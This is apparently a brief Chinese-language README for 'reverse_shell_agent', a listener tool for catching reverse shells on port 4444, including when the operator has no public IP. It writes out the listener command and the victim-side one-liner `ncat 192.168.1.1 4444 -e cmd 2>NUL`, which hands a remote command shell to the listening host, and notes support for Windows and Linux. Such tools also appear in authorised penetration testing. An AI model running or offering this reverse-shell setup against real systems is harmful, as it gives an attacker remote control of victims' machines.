## Reverse_shell_agent

使用 reverse_shell_agent 监听 4444 端口 `python reverse_shell_agent.py -p 4444`

另一端执行反弹 shell `ncat 192.168.1.1 4444 -e cmd 2>NUL` 即可接到反弹 shell

适用于 Windows 和 Linux，需要在监听时进行选择。

主要考虑使用场景：

1. 没有外网 ip 但想要接收反弹 shell 的。
2. 云函数接收反弹 shell（未来实现）